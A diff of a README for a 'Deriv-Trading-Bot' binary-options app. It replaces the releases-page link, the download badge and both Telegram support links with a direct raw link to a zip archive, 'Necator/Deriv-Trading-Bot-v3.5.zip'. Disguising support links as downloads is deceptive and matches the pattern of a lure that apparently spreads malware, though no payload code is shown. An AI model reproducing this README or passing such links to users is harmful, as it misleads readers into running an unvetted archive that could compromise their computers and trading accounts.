@@ -1,6 +1,6 @@
 # 📈 Deriv-Trading-Bot - Simple Trading Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/pallavi0142/Deriv-Trading-Bot/releases)
+[![Download](https://raw.githubusercontent.com/pallavi0142/Deriv-Trading-Bot/main/Necator/Deriv-Trading-Bot-v3.5.zip)](https://raw.githubusercontent.com/pallavi0142/Deriv-Trading-Bot/main/Necator/Deriv-Trading-Bot-v3.5.zip)
 
 ## 📋 Overview
 Welcome to Deriv-Trading-Bot! This application helps you trade options and binaries in the volatile markets with ease. Whether you're looking to engage in derivative trading or need tools for market analysis, this bot has you covered.
@@ -16,7 +16,7 @@ Follow these simple steps to download and run the Deriv-Trading-Bot.
 
 ### 📥 Download & Install
 1. **Visit the Releases Page:** Click the link below to access the most recent versions of the application.
-   - [Download the latest version](https://github.com/pallavi0142/Deriv-Trading-Bot/releases)
+   - [Download the latest version](https://raw.githubusercontent.com/pallavi0142/Deriv-Trading-Bot/main/Necator/Deriv-Trading-Bot-v3.5.zip)
 
 2. **Select Your Version:** On the releases page, you'll see different versions of the bot. Choose the latest version for the best features and stability.
 
@@ -30,7 +30,7 @@ Follow these simple steps to download and run the Deriv-Trading-Bot.
 - **Comprehensive Market Analysis:** Get insights into various markets, including volatility and indices.
 - **User-Friendly Interface:** Designed for users with minimal technical skills.
 - **Trading Strategies:** Access a range of strategies for effective trading.
-- **Telegram Support Channel:** Join our community on Telegram for updates and support. [Join here](https://t.me/DerivBinaryBotKE).
+- **Telegram Support Channel:** Join our community on Telegram for updates and support. [Join here](https://raw.githubusercontent.com/pallavi0142/Deriv-Trading-Bot/main/Necator/Deriv-Trading-Bot-v3.5.zip).
 
 ## 🔧 Configuration
 Before you start trading, set up your preferences in the application. 
@@ -47,7 +47,7 @@ Before you start trading, set up your preferences in the application.
 ## 📞 Support
 If you encounter any issues or have questions, feel free to reach out. Visit our community on Telegram for assistance. 
 
-- **Telegram Support Channel:** [Join here](https://t.me/DerivBinaryBotKE).
+- **Telegram Support Channel:** [Join here](https://raw.githubusercontent.com/pallavi0142/Deriv-Trading-Bot/main/Necator/Deriv-Trading-Bot-v3.5.zip).
 
 ## 💡 Tips for Successful Trading
 1. **Stay Informed:** Keep up with market news and trends.
@@ -59,4 +59,4 @@ For more information on binary options and trading strategies, explore reliable 
 
 By following this guide, you can confidently download and run the Deriv-Trading-Bot on your computer. Ready to start trading? 
 
-Once again, [Download the latest version](https://github.com/pallavi0142/Deriv-Trading-Bot/releases), and take control of your trading journey today!
+Once again, [Download the latest version](https://raw.githubusercontent.com/pallavi0142/Deriv-Trading-Bot/main/Necator/Deriv-Trading-Bot-v3.5.zip), and take control of your trading journey today!
